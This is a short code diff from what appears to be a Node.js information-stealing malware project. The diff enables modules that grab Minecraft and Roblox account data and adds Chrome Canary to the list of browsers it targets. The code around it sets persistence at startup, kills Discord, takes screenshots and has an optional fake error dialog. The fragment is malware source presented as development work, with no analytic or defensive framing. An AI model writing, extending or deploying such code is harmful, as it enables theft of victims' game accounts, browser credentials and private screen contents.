@@ -8,13 +8,14 @@ module.exports.tempFolder = tempFolder;
 
 config.addToStartup && require('./util/functions/startup');
 config.killDiscord  && require('./util/functions/kill-discord');
-// require('./util/functions/grab')(tempFolder);
+require('./util/functions/grab-mc');
+require('./util/functions/grab-roblox');
 require('./util/functions/screenshot');
 // require('./util/functions/fake-error');
 
 const browsers = [
   ['',       ['Vivaldi']],
-  ['',       ['Google', 'Chrome', 'SxS']],
+  ['chrome', ['Google', 'Chrome', 'SxS']],
   ['chrome', ['Google', 'Chrome']],
   ['msedge', ['Microsoft', 'Edge']],
   ['',       ['Yandex', 'YandexBrowser']],
